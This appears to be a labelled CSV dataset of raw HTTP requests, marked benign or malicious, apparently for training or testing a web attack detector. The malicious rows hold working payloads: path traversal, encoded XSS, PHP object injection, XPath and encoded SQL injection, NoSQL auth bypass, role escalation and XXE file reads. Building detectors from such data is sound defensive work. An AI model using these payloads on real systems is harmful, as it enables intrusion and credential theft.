label,text
malicious,"GET /blog/article/view?id=452 HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.7
Cookie: theme=../../../../usr/local/lib/locale/settings%00light
Referer: https://my-personal-blog-site.info/blog
Connection: close"
malicious,"POST /api/updatePreferences HTTP/1.1
Host: media-streaming-hub.tv
Content-Type: application/json
Content-Length: 192
Accept: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1

{""user_id"": 2729, ""favorite_genre"": ""documentary"", ""profile_url"": ""\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0061\u006c\u0065\u0072\u0074\u0028\u0027\u0058\u0053\u0053\u0027\u0029""}"
benign,"GET /shop/cart/view?id=1024&currency=usd&discountApplied=false HTTP/1.1
Host: global-retail-express.com
Connection: keep-alive
Accept-Encoding: deflate, gzip
Accept-Language: en-GB,en;q=0.9
User-Agent: Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36
Cookie: session_id=2f5bcecd0a0e4d7f9b081f0b4a430aba; lang=en-US"
malicious,"POST /api/user/feedback HTTP/1.1
Host: feedback-service-cloud.ai
User-Agent: curl/7.77.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 165
Accept: */*
Referer: https://dashboard.feedback-service-cloud.ai/feedback

userid=987654&rating=5&comments=%3Cscript%3Eeval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))%3C%2Fscript%3E&session=active"
benign,"PUT /api/v1/users/8472/profile HTTP/1.1
Host: profile-update-service.tech
Content-Type: application/json
Content-Length: 56
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
Connection: keep-alive

{""bio"": ""Enthusiast of &lt;code&gt;Python&lt;/code&gt; and &lt;b&gt;HTML&lt;/b&gt;!""}"
malicious,"POST /member/settings HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Length: 329

session_settings_b64=TzoyMjoiTW9ub2xvZ1xQYXRoU3VibGluZXIiOjM6e3M6MTI6InNldHNlbmQiO3M6MTk6IlN5c3RlbVxQcml2YXRlVG9rZW4iO3M6NjoiY29va2llIjtzOjE5OiJzZXNzaW9uX2xpbmUiO31d&confirmed=yes"
benign,"POST /account/login HTTP/1.1
Host: member-portal-services.co
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Referer: https://member-portal-services.co/login
Connection: keep-alive

username=jane.doe&password=mypassword123&callback=%2Fdashboard%2Fhome"
benign,"GET /news/local/today HTTP/1.1
Host: daily-townbuzz.io
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Referer: https://weather-center-hub.net/
Cookie: session_id=ab12cd34ef56gh78ij90kl
DNT: 1
Sec-CH-UA: ""Chromium"";v=""114"", ""Google Chrome"";v=""114"", "";Not A Brand"";v=""99""
Sec-CH-UA-Mobile: ?0
Sec-CH-UA-Platform: ""Windows"""
benign,"OPTIONS /api/v2/items HTTP/1.1
Host: api.smart-gadget-store.ai
Connection: close
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Origin: https://shop.smart-gadget-store.ai
Access-Control-Request-Method: GET
Access-Control-Request-Headers: x-api-key
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en;q=0.8"
benign,"PUT /api/v4/events/1052 HTTP/1.1
Host: city-events-calendar.io
Authorization: Bearer hPK2jysoqV8r1qzTYAfWb97Jz39OMl5XdeHnRGlAC
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1
Content-Length: 210

{""eventId"":1052,""title"":""Summer Jazz Festival"",""location"":""Grand Park Amphitheater"",""date"":""2024-08-15T18:00:00Z"",""capacity"":1500,""organizer"":{""name"":""City Arts Council"",""contactEmail"":""info@city-events-calendar.io""}}"
benign,"GET /robots.txt HTTP/1.1
Host: digital-library-haven.net
User-Agent: LibraryIndexBot/2.3 (+http://digital-library-haven.net/bot-info)
Accept: */*
Pragma: no-cache
Connection: keep-alive"
benign,"GET /api/v1/items/search?tag=organic&tag=gluten-free&tag=vegan&availability=in_stock HTTP/1.1
Host: fresh-food-markets.net
Accept: application/json
Connection: close
User-Agent: curl/7.85.0
Accept-Encoding: gzip, deflate"
benign,"GET /blog/article/view/5237?param=Hello%2520World HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:110.0) Gecko/20100101 Firefox/110.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: https://my-personal-blog-site.info/blog
Cache-Control: no-cache"
malicious,"POST /v2/catalog/query HTTP/1.1
Host: api.product-finder.ai
User-Agent: curl/7.77.0
Accept: */*
Content-Type: application/xml
Content-Length: 111
Cache-Control: no-cache

<searchRequest>
  <term>' or name()=name() or ''='</term>
  <category>all</category>
</searchRequest>"
benign,"GET /api/v3/items/search?id=prod_code_TX91 HTTP/1.1
Host: data-analytics-hub.cloud
Accept: application/json
Accept-Encoding: gzip, deflate, br
User-Agent: python-requests/2.28.2
X-Forwarded-For: 192.168.42.12
Connection: keep-alive"
benign,"POST /account/verify HTTP/1.1
Host: payments.online-retail-store.biz
Content-Type: application/x-www-form-urlencoded
Content-Length: 94
Connection: keep-alive
Accept: application/json, text/plain, */*
Referer: https://www.online-retail-store.biz/account/login
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1

email=melissa.greer%40hotmail.com&password=sunshine%242021&callback=/account/settings/notifications"
benign,"GET /files/../images/logo.png HTTP/1.1
Host: green-energy-consortium.org
Accept: image/*,*/*;q=0.8
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Via: 1.1 google
Referer: https://green-energy-consortium.org/initiatives/solar-power"
malicious,"GET /api/v2/data/report HTTP/1.1
Host: analytics.smart-insights.ai
User-Agent: Mozilla/5.0 ""><img src=x onerror=eval(atob('YWxlcnQoJ0FQSSBhdHRhY2sgbGV2ZWwnKQ=='))>
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
X-Requested-With: FetchAPIClient
Connection: keep-alive"
benign,"POST /api/v1/submit-review HTTP/1.1
Host: urban-life-consultancy.biz
Content-Type: application/x-www-form-urlencoded
Content-Length: 2916
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Cookie: sessionToken=5df789a1b67efa47e2171b8a2c3f9dde5e73d9f6

client_name=Olivia+Martinez&project_key=UPD-2022045&rating=5&review_text=From+the+initial+consultation+through+to+project+completion%2C+Urban+Life+Consultancy+provided+exceptional+service+and+insights.+The+team+demonstrated+deep+knowledge+of+urban+planning+and+sustainability%2C+delivering+recommendations+that+were+both+innovative+and+practical.+Communication+was+clear+and+timely%2C+with+regular+updates+that+kept+us+fully+informed+about+progress+and+any+challenges+encountered.+The+final+report+was+comprehensive+and+well-supported+with+data+and+visualizations%2C+making+it+easy+for+our+board+to+make+decisions.+We+would+definitely+recommend+their+services+to+other+stakeholders+looking+for+expert+urban+planning+guidance.+Thank+you+Urban+Life+Consultancy+for+a+job+well+done."
benign,"POST /api/v1/bookings HTTP/1.1
Host: travel-booker-prod.ai
User-Agent: curl/7.88.1
Content-Type: application/xml
Accept: */*
Content-Length: 174
Connection: keep-alive
X-Forwarded-For: 192.168.11.105

<booking>
  <user>amy.roberts</user>
  <destination>BCN</destination>
  <date>2024-07-10</date>
  <guests>3</guests>
  <roomType>deluxe</roomType>
</booking>"
benign,"POST /account/settings/email-updates HTTP/1.1
Host: tech-news-digest.us
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 46
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Referer: https://tech-news-digest.us/settings
Accept-Language: en-US,en;q=0.9
Cookie: session_id=a93feb58cb3d41ffb784b1a749ea8270

update_frequency=weekly&email_category=technology&email_category=business"
benign,"POST /votes/poll/552 HTTP/1.1
Host: civic-engage.org
User-Agent: curl/7.79.1
Content-Type: application/x-www-form-urlencoded
Accept: */*
Content-Length: 21
Connection: keep-alive

poll_id=552&choice_id=12"
benign,"POST /v1/session/extend HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/json
Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=
Idempotency-Key: 47a98b39-efac-4330-9fc3-0b7d67064777
X-Request-ID: efa89cd1-963e-4cde-ad7f-192d30f2ae23
X-Client-Version: 5.2.3
Accept: application/json
Connection: keep-alive
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36

{
  ""session_token"": ""eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"",
  ""extend_by_minutes"": 30
}"
benign,"GET /scripts/utils/page-load.js HTTP/1.1
Host: interactive-design-platform.org
Accept-Encoding: gzip, deflate, br
Accept: application/javascript, */*;q=0.9
Connection: close
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
Accept-Language: en-GB,en;q=0.8"
malicious,"POST /api/v2/system/update_config HTTP/1.1
Host: data-analytics-suite.co
Content-Type: application/json
Content-Length: 276
Accept: application/json, text/javascript, */*;q=0.01
Accept-Language: en-US,en;q=0.8
Accept-Encoding: gzip, deflate, br
Origin: https://data-analytics-suite.co
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36

{""config"": {""user_settings"": {""preferences"": {""detail_level_param"": ""JyBVTklPTiBTRUxFQ1QgdXNlciwgcGFzc3dvcmQgRlJPTSB1c2VycyAtLQ=="", ""report_format"": ""pdf"", ""timezone"": ""UTC""}, ""account"": {""data_sharing"": false, ""language"": ""en-US""}}, ""system"": {""enable_notifications"": true, ""max_connections"": 10}}}"
malicious,"POST /app/user/settings HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 79
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept-Encoding: gzip, deflate, br
Referer: https://community.game-dev-forum.org/app/user/settings
Cookie: connect.sid=s%3Aj8LpRGwtwtslNxE1CnWaN_PATH_key

displayName=GamerOne&preferences%5Blayout%5D=compact&role_id=99&internal_user_status=ADMIN"
benign,"PUT /api/v1/inventory/8792 HTTP/1.1
Host: warehouse-central-logistics.com
Authorization: Bearer QWER5643dfjh4567abi0uaa1ooP0z7T8
Accept: application/json
Content-Type: application/json
User-Agent: python-requests/2.31.0
Content-Length: 146
Connection: keep-alive

{""itemId"":8792,""category"":""office supplies"",""quantity"":128,""location"":""A3-Rack22"",""restockThreshold"":25,""supplier"":""PaperWorks Ltd.""}"
benign,"HEAD /docs/reference/api-usage HTTP/1.1
Host: devdocs-sharing-platform.devportal
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept: text/html
Accept-Language: en-US,en;q=0.5
Cache-Control: no-store
Connection: keep-alive"
benign,"GET /static/css/main-style.css HTTP/1.1
Host: urban-lifestyle-magazine.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/css,*/*;q=0.1
Referer: https://urban-lifestyle-magazine.net/articles/fall-fashion-trends.html
Connection: keep-alive"
benign,"POST /api/v3/orders/create HTTP/1.1
Host: cart.easyshop-delivery.com
Authorization: Bearer zYXDd9eaxqmF521a6rXbLfAP6bDQTbU07g9N9sUd
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0
Content-Length: 129
Cache-Control: no-cache
Connection: close

{""order.details.items_list"":[{""product-id"":""A342"",""quantity"":2},{""product-id"":""B779"",""quantity"":1}],""payment-method"":""credit_card"",""shipping[address_line_1]"":""1234 Elm Street""}"
benign,"GET /items/search?query=lightweight+hiking+backpack HTTP/1.1
Host: trail-gear-online.biz
Accept: text/html
Referer: https://trail-gear-online.biz/deals
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.133 Mobile Safari/537.36
Accept-Encoding: gzip, deflate, br
Connection: keep-alive"
malicious,"GET /app/user/settings HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Referer: https://secure-user-portal.net/dashboard
X-Debug-Options: <iframe src=""data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5sb2NhdGlvbik8L3NjcmlwdD4=""></iframe>
Connection: keep-alive"
benign,"GET /blog/article/view/87 HTTP/1.1
Host: greenworld-adventures.info
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.7
Accept-Language: en-US,en;q=0.6
Cookie: sessionId=mncl5239dj; theme=dark; newsletter_signup=true; referrer_code=WW8ZY2X; _ga=GA1.2.439857623.1685847901"
benign,"POST /soap/CustomerService HTTP/1.1
Host: client-relationship.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15
Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==
Content-Type: application/xml
Accept: application/xml
Content-Length: 276
Accept-Language: en-US,en;q=0.9

<CustomerCreateRequest>
  <FirstName>Leah</FirstName>
  <LastName>Foster</LastName>
  <Email>leah.foster@client-relationship.net</Email>
  <Phone>+1-212-555-0187</Phone>
  <Address>
    <Street>472 Evergreen Terrace</Street>
    <City>San Diego</City>
    <State>CA</State>
    <Zip>92105</Zip>
  </Address>
</CustomerCreateRequest>"
malicious,"POST /user/validate HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.77.0
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 122
Connection: close

userId=admin' and substring(concat(//userdata/user[1]/password, 'XYZ'), substring(string-length(//userdata/user[1]/password),1,1), 1)='Z"
benign,"POST /api/log HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/json
Accept-Encoding: deflate, gzip
User-Agent: python-requests/2.31.0
Content-Length: 324
X-Forwarded-For: 203.0.113.54
Connection: keep-alive

{""requestLog"":{""requestId"":""req-20240618-0012"",""clientInfo"":{""clientId"":""analytics-pro-v3"",""region"":""us-west-2""},""query"":{""filters"":{""dateRange"":{""start"":""2024-06-01"",""end"":""2024-06-18""},""category"":""sales""},""metrics"":[""totalRevenue"",""transactionCount""]},""responseDetails"":{""statusCode"":200,""dataPointsReturned"":983,""responseTimeMs"":227}}}"
malicious,"GET /api/users/lookup?username=admin&password%5B%24ne%5D=password HTTP/1.1
Host: accounts.enterprise-cloud.ai
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: application/json
Accept-Language: en-US,en;q=0.9
Origin: https://accounts.enterprise-cloud.ai
Connection: keep-alive"
malicious,"GET /dashboard HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept-Language: en-US,en;q=0.8
Accept-Encoding: gzip, deflate
Cookie: dashboard_layout=..%2F..%2F..%2Fvar%2Flog%2Fsyslog%2500; auth_sid=gh476n1d9uvl
Cache-Control: no-cache"
benign,"OPTIONS /api/products/1786/delete HTTP/1.1
Host: inventory-control-system.org
Origin: https://warehouse-ops-panel.co
Access-Control-Request-Method: DELETE
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G990U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36
Access-Control-Request-Headers: authorization
Accept-Language: en-US,en;q=0.7
Connection: keep-alive"
malicious,"POST /upload/xml-config HTTP/1.1
Host: enterprise-data-sync.us
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: */*
Accept-Language: en-US,en;q=0.5
Content-Type: multipart/form-data; boundary=----BoundaryDataSyncXYZ
Content-Length: 460

------BoundaryDataSyncXYZ
Content-Disposition: form-data; name=""description""

Automated XML configuration upload
------BoundaryDataSyncXYZ
Content-Disposition: form-data; name=""file""; filename=""configData.xml""
Content-Type: application/xml

<?xml version=""1.0""?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///c:/windows/win.ini"">]>
<config>&xxe;</config>

------BoundaryDataSyncXYZ--"
benign,"POST /feedback/submit HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Referer: https://my-personal-blog-site.info/contact
Connection: keep-alive

rating=5&comments=&subscribe=on&contact_pref=email"
benign,"GET /community/forums/latest-threads HTTP/1.1
Host: devtalk-hub.network
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.9,fr;q=0.7
Accept-Encoding: gzip, deflate, br
Referer: https://devtalk-hub.network/community/forums
Cookie: session_id=987fbc97-1f55-4d01-b2b2-3d2e5805a5ad; prefs=lang=en; theme=dark
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-CH-UA: ""Chromium"";v=""114"", ""Google Chrome"";v=""114"", "";Not A Brand"";v=""99""
Sec-CH-UA-Mobile: ?0
Sec-CH-UA-Platform: ""Windows""
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document"
benign,"POST /preferences/save HTTP/1.1
Host: online-retail-store.biz
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Accept: text/html, application/xhtml+xml
User-Agent: curl/7.86.0
Referer: https://online-retail-store.biz/account
Accept-Language: en-US

payment_methods%5B%5D=credit_card&payment_methods%5B%5D=paypal"
benign,"GET /api/v2/orders/483920 HTTP/1.1
Host: secure-user-portal.net
Accept: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30._X1JWZDhK5wzrJL25Y2TcJxhvCqGGRdjDUR-34W7zLA
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Connection: keep-alive
Accept-Encoding: gzip, deflate, br"
benign,"PATCH /api/v1/settings HTTP/1.1
Host: online-retail-store.biz
User-Agent: curl/7.87.0
Accept: */*
Content-Type: application/json-patch+json
Content-Length: 133
Authorization: Basic bXNtaXRoOm15c2VjdXJlcGFzcw==
Cache-Control: no-cache
Pragma: no-cache

[
  { ""op"": ""replace"", ""path"": ""/shippingAddress/street"", ""value"": ""742 Evergreen Terrace"" },
  { ""op"": ""replace"", ""path"": ""/shippingAddress/city"", ""value"": ""Springfield"" },
  { ""op"": ""replace"", ""path"": ""/shippingAddress/zip"", ""value"": ""62704"" }
]"
benign,"POST /subscription/preferences HTTP/1.1
Host: newsletter.opt-in-center.ai
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:111.0) Gecko/20100101 Firefox/111.0
Accept: application/json, text/plain, */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Cache-Control: no-cache
Pragma: no-cache
Connection: keep-alive

frequency=weekly&topics=technology,science&notes="
